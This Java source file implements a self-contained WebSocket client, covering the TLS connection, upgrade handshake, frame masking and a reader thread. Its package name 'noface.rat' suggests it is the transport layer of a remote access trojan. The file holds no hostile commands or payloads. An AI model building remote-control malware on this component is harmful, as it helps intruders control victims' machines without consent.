package noface.rat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.BiConsumer;
import java.util.function.Consumer;

public final class Sock {

    private static final int MAX_FRAME = 6 * 1024 * 1024;
    private final URI uri;
    private Socket sock;
    private InputStream in;
    private OutputStream out;
    private final AtomicBoolean open = new AtomicBoolean(false);
    private Thread reader;
    private Consumer<String> onText;
    private BiConsumer<byte[], Integer> onBin;
    private Runnable onClose;
    private final Object io = new Object();

    public Sock(String wsUrl) {
        this.uri = URI.create(wsUrl);
    }

    public void onText(Consumer<String> c) { this.onText = c; }
    public void onBin(BiConsumer<byte[], Integer> c) { this.onBin = c; }
    public void onClose(Runnable r) { this.onClose = r; }

    public boolean connected() { return open.get(); }

    public void connect() throws Exception {
        synchronized (io) {
            hardClose();
            String host = uri.getHost();
            boolean tls = "wss".equalsIgnoreCase(uri.getScheme());
            int port = uri.getPort();
            if (port < 0) port = tls ? 443 : 80;
            if (tls) {
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                SSLSocket ssl = (SSLSocket) factory.createSocket();
                ssl.connect(new InetSocketAddress(host, port), 8000);
                SSLParameters params = ssl.getSSLParameters();
                params.setServerNames(java.util.List.of(new SNIHostName(host)));
                ssl.setSSLParameters(params);
                ssl.startHandshake();
                sock = ssl;
            } else {
                sock = new Socket();
                sock.connect(new InetSocketAddress(host, port), 8000);
            }
            sock.setTcpNoDelay(true);
            sock.setKeepAlive(true);
            sock.setSoTimeout(120_000);
            in = sock.getInputStream();
            out = sock.getOutputStream();
            String path = uri.getRawPath();
            if (path == null || path.isEmpty()) path = "/";
            if (uri.getRawQuery() != null) path += "?" + uri.getRawQuery();
            byte[] key = new byte[16];
            new SecureRandom().nextBytes(key);
            String keyB64 = Base64.getEncoder().encodeToString(key);
            String req =
                    "GET " + path + " HTTP/1.1\r\n" +
                    "Host: " + host + (uri.getPort() > 0 ? ":" + uri.getPort() : "") + "\r\n" +
                    "Upgrade: websocket\r\n" +
                    "Connection: Upgrade\r\n" +
                    "Sec-WebSocket-Key: " + keyB64 + "\r\n" +
                    "Sec-WebSocket-Version: 13\r\n\r\n";
            out.write(req.getBytes(StandardCharsets.US_ASCII));
            out.flush();
            String status = readLine();
            if (status == null || !status.contains("101")) {
                hardClose();
                throw new IllegalStateException("ws " + status);
            }
            while (true) {
                String line = readLine();
                if (line == null || line.isEmpty()) break;
            }
            open.set(true);
            reader = new Thread(this::loop, "ws-r");
            reader.setDaemon(true);
            reader.start();
        }
    }

    public void sendText(String s) throws Exception {
        if (s == null) return;
        byte[] data = s.getBytes(StandardCharsets.UTF_8);
        if (data.length > MAX_FRAME) return;
        frame(0x1, data);
    }

    public void sendBin(byte[] data) throws Exception {
        if (data == null || data.length == 0 || data.length > MAX_FRAME) return;
        frame(0x2, data);
    }

    private void frame(int opcode, byte[] payload) throws Exception {
        synchronized (io) {
            if (!open.get() || out == null) return;
            int len = payload.length;
            ByteArrayOutputStream hdr = new ByteArrayOutputStream(14);
            hdr.write(0x80 | (opcode & 0x0f));
            if (len < 126) {
                hdr.write(0x80 | len);
            } else if (len <= 0xffff) {
                hdr.write(0x80 | 126);
                hdr.write((len >>> 8) & 0xff);
                hdr.write(len & 0xff);
            } else {
                hdr.write(0x80 | 127);
                for (int i = 7; i >= 0; i--) {
                    hdr.write((int) (((long) len >>> (8 * i)) & 0xff));
                }
            }
            byte[] mask = new byte[4];
            new SecureRandom().nextBytes(mask);
            hdr.write(mask);
            out.write(hdr.toByteArray());
            byte[] chunk = new byte[Math.min(8192, len)];
            int off = 0;
            while (off < len) {
                int n = Math.min(chunk.length, len - off);
                for (int i = 0; i < n; i++) {
                    chunk[i] = (byte) (payload[off + i] ^ mask[(off + i) & 3]);
                }
                out.write(chunk, 0, n);
                off += n;
            }
            out.flush();
        }
    }

    private void loop() {
        try {
            while (open.get()) {
                int b0 = in.read();
                if (b0 < 0) break;
                int b1 = in.read();
                if (b1 < 0) break;
                int opcode = b0 & 0x0f;
                boolean masked = (b1 & 0x80) != 0;
                long len = b1 & 0x7f;
                if (len == 126) {
                    int hi = in.read();
                    int lo = in.read();
                    if (hi < 0 || lo < 0) break;
                    len = ((hi & 0xff) << 8) | (lo & 0xff);
                } else if (len == 127) {
                    len = 0;
                    boolean bad = false;
                    for (int i = 0; i < 8; i++) {
                        int v = in.read();
                        if (v < 0) { bad = true; break; }
                        len = (len << 8) | (v & 0xff);
                    }
                    if (bad) break;
                }
                if (len < 0 || len > MAX_FRAME) break;
                byte[] mask = null;
                if (masked) {
                    mask = in.readNBytes(4);
                    if (mask.length < 4) break;
                }
                byte[] payload = in.readNBytes((int) len);
                if (payload.length < len) break;
                if (masked && mask != null) {
                    for (int i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3];
                }
                if (opcode == 0x8) break;
                if (opcode == 0x9) {
                    frame(0xA, payload);
                    continue;
                }
                if (opcode == 0xA) continue;
                if (opcode == 0x1 && onText != null) {
                    onText.accept(new String(payload, StandardCharsets.UTF_8));
                } else if (opcode == 0x2 && onBin != null) {
                    onBin.accept(payload, payload.length);
                }
            }
        } catch (Exception ignored) {
        } finally {
            open.set(false);
            Runnable cb = onClose;
            hardClose();
            if (cb != null) {
                try { cb.run(); } catch (Exception ignored) {}
            }
        }
    }

    private String readLine() throws Exception {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        int prev = -1;
        int guard = 0;
        while (guard++ < 8192) {
            int c = in.read();
            if (c < 0) return null;
            if (prev == '\r' && c == '\n') break;
            if (prev != -1 && prev != '\r') b.write(prev);
            else if (prev == '\r') b.write('\r');
            prev = c;
        }
        if (prev != '\r' && prev != -1) b.write(prev);
        String s = b.toString(StandardCharsets.US_ASCII);
        if (s.endsWith("\r")) s = s.substring(0, s.length() - 1);
        return s;
    }

    public void close() {
        open.set(false);
        synchronized (io) {
            hardClose();
        }
    }

    private void hardClose() {
        open.set(false);
        try { if (sock != null) sock.close(); } catch (Exception ignored) {}
        sock = null;
        in = null;
        out = null;
    }
}
